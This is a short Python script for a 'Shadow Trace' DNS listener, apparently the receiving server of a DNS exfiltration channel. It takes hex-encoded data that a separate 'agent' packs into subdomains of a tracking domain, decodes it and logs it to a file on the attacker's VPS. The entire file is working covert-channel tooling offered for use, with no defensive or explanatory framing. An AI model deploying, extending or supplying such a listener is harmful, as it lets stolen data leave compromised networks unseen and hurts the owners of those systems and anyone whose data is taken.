#!/usr/bin/env python3
# Shadow Trace DNS Listener — run on your VPS with port 53 open
from dnslib import DNSRecord, RR, TXT, QTYPE, A
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import threading, base64, time, os

LOG_FILE = "/tmp/shadow_trace.log"
DOMAIN = "track.your-domain.com"  # same as agent
DATA_BUFFER = {}

class ShadowResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        if not qname.endswith(DOMAIN + '.'):
            return request.reply()
        # Extract hex chunk
        sub = qname.replace('.' + DOMAIN + '.', '')
        sub = sub.rstrip('.')
        try:
            # reconstruct data
            hexdata = sub
            raw = bytes.fromhex(hexdata).decode('utf-8', errors='ignore')
            # Use client IP as session ID? Use timestamp? Simple: just log
            with open(LOG_FILE, 'a') as f:
                f.write(f"{raw}\n")
            # Send dummy A record
            return request.reply()
        except Exception as e:
            return request.reply()

def start_dns():
    resolver = ShadowResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    server.start()
    print("[*] Shadow Trace DNS server listening on 0.0.0.0:53")

if __name__ == "__main__":
    start_dns()
    while True:
        time.sleep(1)